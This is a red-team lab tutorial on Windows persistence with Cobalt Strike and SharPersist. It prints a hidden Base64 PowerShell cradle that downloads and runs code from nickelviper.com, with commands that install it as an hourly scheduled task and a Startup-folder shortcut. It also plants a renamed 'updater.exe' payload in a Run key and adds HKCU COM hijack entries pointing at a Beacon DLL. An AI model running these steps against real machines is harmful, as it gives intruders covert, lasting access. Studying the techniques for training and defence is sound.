---
description: 09/03/2025
---

# ✅ Host Persistence

## What is Persistence?

Persistence is a method of regaining or maintaining access to a compromised machine.

This is performed so that you do not need to exploit the initial compromise steps once more.

* Very important as workstations are volatile and users tend to logout/reboot frequently

### Hypothetical

If you had success gaining access via phishing campaign, it's very unlikely that you'll be able to do so again if your current Beacon is lost, which could indeed mean the end of the engagement. However, if you're performing an _**assume-breach**_ and have access to an internal host, the loss of complete access to the environment is much less of a concern.&#x20;

However, you still may need to drop one or more persistence mechanisms on hosts you control.

## Installing Persistence

This usually involves making some configuration change or dropping a payload to disk, which is why they can carry a _**high risk**_ of detection. However, they are both extremely useful and practical during long-term engagements.

You must strike a delicate balance of keeping the operating going and getting caught.

Persistence can be executed within userland (e.g. current user) or in an elevated context such as `SYSTEM`. Elevated persistence requires that we become local admin on the host first, which is made possible via _**Privilege Escalation**_.

### Common userland persistence methods

* HKCU/HKLM Registry Autoruns
* Schedules Tasks
* Startup Folder

### Disclaimer about Cobalt Strike

Cobalt Strike does not include any built-in commands specifically for persistence.&#x20;

[SharPersist](https://github.com/fireeye/SharPersist) is a Windows persistence toolkit written by FireEye.

Conveniently, it is written in C#, so it can be executed via `execute-assembly`.

## Task Scheduler

The Windows Task Scheduler allows us to create "tasks" that execute on a predetermined trigger.

That trigger can be a time of day, upon user-logon, when the computer goes idle, when the computer is locked, or a combination thereof.

### Creating a Scheduled Task

Here, we will be creating a scheduled task that will execute a PowerShell payload once every hour.

This will save ourselves from having to deal with lots of quotations within the IEX cradle, we can encode it to `Base64` and execute it using the `EncodedCommand` parameter in PowerShell (often appreciated to `-enc`). This is a little complicated to do, because it must use Unicode encoding (rather than `UTF-8` or ASCII).

#### In PowerShell (execute on the victim machine directly):

{% code overflow="wrap" %}
```powershell
PS C:\> $str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA
```
{% endcode %}

**In Linux:**

{% code overflow="wrap" %}
```
ubuntu@DESKTOP-3BSK7NO ~> set str 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
ubuntu@DESKTOP-3BSK7NO ~> echo -en $str | iconv -t UTF-16LE | base64 -w 0
SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA
```
{% endcode %}

**Then on the Beacon:**

{% code overflow="wrap" %}
```
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA" -n "Updater" -m add -o hourly

[*] INFO: Adding scheduled task persistence
[*] INFO: Command: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
[*] INFO: Command Args: -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA
[*] INFO: Scheduled Task Name: Updater
[*] INFO: Option: hourly
[+] SUCCESS: Scheduled task added
```
{% endcode %}

**Syntax information:**

* `-t` is the desired persistence technique.
* `-c` is the command to execute.
* `-a` are any arguments for that command.
* `-n` is the name of the task.
* `-m` is to add the task (you can also `remove`, `check` and `list`).
* `-o` is the task frequency.

#### Practice

On the console of Workstation 2, open the Task Scheduler and select _Task Scheduler Library_ in the left-hand menu.  You should see your task appear in the main window. &#x20;

You may of course wait for one hour, or simply highlight the task and click _Run_ in the right-hand _Actions_ menu.  This should spawn another Beacon.

## Startup Folder

Applications, files, and shortcuts all live within a user's startup folder and are launched automatically upon logging in for the first time upon startup.&#x20;

This directory is commonly used to _**bootstrap**_ the user's home environment (setting wallpapers, establishing shortcuts for applications, etc.).

{% code overflow="wrap" %}
```
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA" -f "UserEnvSetup" -m add

[*] INFO: Adding startup folder persistence
[*] INFO: Command: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
[*] INFO: Command Args: -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA
[*] INFO: File Name: UserEnvSetup
[+] SUCCESS: Startup folder persistence created
[*] INFO: LNK File located at: C:\Users\bfarmer\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UserEnvSetup.lnk
[*] INFO: SHA256 Hash of LNK file: B34647F8D8B7CE28C1F0DA3FF444D9B7244C41370B88061472933B2607A169BC
```
{% endcode %}

**Syntax information:**

* `-f` is the filename to save as.

#### Practice

**Use the Workstation 2 console to check the following:**

`C:\Users\bfarmer\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\` for the file that was dropped.  To simulate a logoff and logon via Guacamole, right-click the Windows start icon and select _Shut down or sign out > Sign out_.  Guacamole will then give you the options to _reconnect_ or _logout_.  Select _reconnect_ and it will log you back in.

## Registry AutoRun

**AutoRun** values in **HKCU** and **HKLM** allow **applications** to **start upon boot**.

### HKLM

This is a Registry value (`HKEY_LOCAL_MACHINE`) that stores system-wide settings that apply to ALL users and hardware.

### HKCU

This is another Registry value (`HKEY_CURRENT_USER`) that stores configuration data and preferences that are _**specific to a single (or currently logged in)**_ user.

### Usage

You will commonly see these to start native and third-party applications such as software updating utilities, download assistants, driver utilities, and so on.&#x20;

{% code overflow="wrap" %}
```
beacon> cd C:\ProgramData
beacon> upload C:\Payloads\http_x64.exe
beacon> mv http_x64.exe updater.exe
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add

[*] INFO: Adding registry persistence
[*] INFO: Command: C:\ProgramData\Updater.exe
[*] INFO: Command Args: /q /n
[*] INFO: Registry Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
[*] INFO: Registry Value: Updater
[*] INFO: Option: 
[+] SUCCESS: Registry persistence added
```
{% endcode %}

**Syntax information:**

* `-k` is the registry key to modify.
* `-v` is the name of the registry key to create.

{% hint style="info" %}
:bulb:It is a common misconception that an HKLM autorun will execute the payload as `SYSTEM`, but this is false.

An HKCU autorun will _**only**_ trigger once the owner of the hive logs into the machine.&#x20;

An HKLM autorun will trigger when any user logs into the machine, but it will still run under the context of the user's account.
{% endhint %}

## Hunting for COM Hijacks

### What is a COM?

A COM, or Windows Component Object Model (COM), is Microsoft technology that enables software components to interact and reuse each other's functionality at runtime.&#x20;

This promotes modularity and interoperability.

### What is a COM Hijack?

This is a technique redteamers and malicious actors perform in order to manipulate the Windows COM to execute their own code on a target system.

#### How?

Attackers abuse how Windows utilizes the Registry to look up and load COM objects, which are components used for inter-process communication (IPC).

### Methodology

Rather than hijacking COMs that are currently in-use and in return, breaking applications that rely on them, a much safer (and reliable) strategy is finding instances of applications trying to load objects that do not actually "exist". These are what are known as "_**abandoned keys"**_.

Process Monitor, a tool within the Microsoft Sysinternals Suite, shows real-time file system, Registry, and process activity.

It is super useful for finding different types of privilege escalation primitives.&#x20;

### How-To

It is more straightforward to "hunt" for hijacks on your own machine first, and then attempt to implement them on the actual target.

#### Practice

Launch `procmon64.exe` on the Attacker Desktop.

Due to a ton of events generated, leveraging the _**filtering**_ option is crucial in terms of finding the ones of interest.

We're looking for:

* `RegOpenKey` operations
* Where the `Result` is `NAME NOT FOUND`
* Path ends with `InprocServer32`

<figure><img src="../.gitbook/assets/image (284).png" alt=""><figcaption><p>Showcasing filtering options within <code>procmon64.exe</code></p></figcaption></figure>

#### Speeding things up (working efficiently)

* Click random things
* Enter the Windows menu, launching applications, etc.
* Wait a minute and you'll have plenty of events to work with

<figure><img src="../.gitbook/assets/image (285).png" alt=""><figcaption></figcaption></figure>

### What to Look out for

One trick is to look out for the number of times a particular Class ID (CLSID) is loaded.

#### What is a CLSID?

This is a serial number that represents a unique identifier for any application component in the Windows OS.

#### Picking the "right" one

If you are able to successfully hijack one that is loaded every couple of seconds, you're going to have a rough time.

Instead, spend additional effort to find one that is loaded semi-frequently but not so much or loaded when a commonly used application is opened (e.g. Word, Excel, Outlook, etc.) is opened.

#### Identifying our target

**Check out this CLSID loaded by `C:\Windows\System32\DllHost.exe`:**

```
HKCU\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32
```

#### PowerShell Trick

**We can utilize PowerShell to showcase that the entry does exist in HKLM, but not in HKCU:**

{% code overflow="wrap" %}
```powershell
PS C:\Users\Attacker> Get-Item -Path "HKLM:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"

Name                           Property
----                           --------
InprocServer32                 (default)      : C:\Windows\System32\thumbcache.dll
                               ThreadingModel : Apartment


PS C:\Users\Attacker> Get-Item -Path "HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32' because it does not exist.
```
{% endcode %}

### Exploitation

In order to exploit this, we can create the necessary Register entries in HKCU and point them at a Beacon DLL.

Because this is still on our attacking machine, we'll point this straight at `C:\Payloads\http_x64.dll`.

{% code overflow="wrap" %}
```powershell
PS C:\Users\Attacker> New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
PS C:\Users\Attacker> New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\Payloads\http_x64.dll"
PS C:\Users\Attacker> New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
{% endcode %}

Once `DllHost.exe` loads this COM entry, we will get a Beacon.

<figure><img src="../.gitbook/assets/image (286).png" alt=""><figcaption></figcaption></figure>

### COM Hijacking Cleanup

**In order to perform cleanup of a COM hijack:**

1. Simply remove the Registry entries within HKCU &#x20;
2. Delete the DLL

### Another great place to look for hijackable COM components...

Look within the Task Scheduler.

Rather than executing binaries on disk (compared to in-memory), many of the default Windows Tasks actually use _**custom triggers**_ to call COM objects.

Since they are executed via the Task Scheduler, it is much easier to predict when they're going to be used rather than relying on luck and chance for the COM object to be utilized when required.

#### Powershell

**Using PowerShell, we can use the following script to find compatible tasks:**

```powershell
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      if ($Task.Principal.GroupId -eq "Users")
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}
```

The script simply creates a variable, `$Tasks` and assigns the output of `Get-ScheduledTask` to itself. This then relies on a `foreach` loop for each instance of a _**Scheduled Task**_ to be displayed along with its `Task Name`, `Task Path`, and corresponding `CLSID`.

**Once ran, you'll see output like this:**

```powershell
Task Name:  SystemSoundsService
Task Path:  \Microsoft\Windows\Multimedia\
CLSID:  {2DEA658F-54C1-4227-AF9B-260AB5FC3543}

Task Name:  MsCtfMonitor
Task Path:  \Microsoft\Windows\TextServicesFramework\
CLSID:  {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}

Task Name:  Calibration Loader
Task Path:  \Microsoft\Windows\WindowsColorSystem\
CLSID:  {B210D694-C8DF-490D-9576-9E20CDBC20BD}

Task Name:  CacheTask
Task Path:  \Microsoft\Windows\Wininet\
CLSID:  {0358B920-0AC7-461F-98F4-58E32CD89148}
```

#### MsCtfMonitor task in Task Manager

Upon viewing the `MsCtfMonitor` task within _**Task Manager**_, we can see that it is triggered once any user logs in.

This would act as an effective _**reboot-persistence**_.

<figure><img src="../.gitbook/assets/image (287).png" alt=""><figcaption></figcaption></figure>

#### Looking up the current implementation of `{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}` in _`HKEY_CLASSES_ROOT\CLSID`_

{% code overflow="wrap" %}
```powershell
PS C:\> Get-ChildItem -Path "Registry::HKCR\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\MsCtfMonitor.dll
               ThreadingModel : Both
```
{% endcode %}

We can see it is another `InprocServer32` and we can verify that it's currently implemented in HKLM, not HKCU.

{% code overflow="wrap" %}
```powershell
PS C:\> Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler


PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
{% endcode %}

#### Lastly...

Now it's simply a case of adding a duplicate entry into HKCU pointing to our DLL (as before), and this will be loaded once every time a user logs in.
